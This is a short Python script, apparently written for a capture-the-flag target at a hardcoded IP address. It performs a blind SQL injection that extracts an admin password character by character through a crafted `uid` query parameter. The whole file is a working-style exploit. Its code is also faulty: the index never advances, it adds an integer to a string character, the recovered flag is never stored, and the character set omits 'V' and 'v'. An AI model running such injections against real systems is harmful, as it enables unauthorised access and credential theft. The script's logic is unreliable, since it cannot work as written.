import requests
import string

url = "http://103.97.125.53:32696"

idx = 1
flag = ""
while idx < 14:
    for i in "ABCDEFGHIJKLMNOPQRSTUWXYZabcdefghijklmnopqrstuwxyz0123456789":
        urls = f"{url}/?uid= admin' and substr(upw, {idx}, 1) like '{i}' -- -"
        r = requests.get(urls)
        if "exists" in r.text:
            print(f"Password is {flag+i}")
            i += 1
print(flag)
        
        
        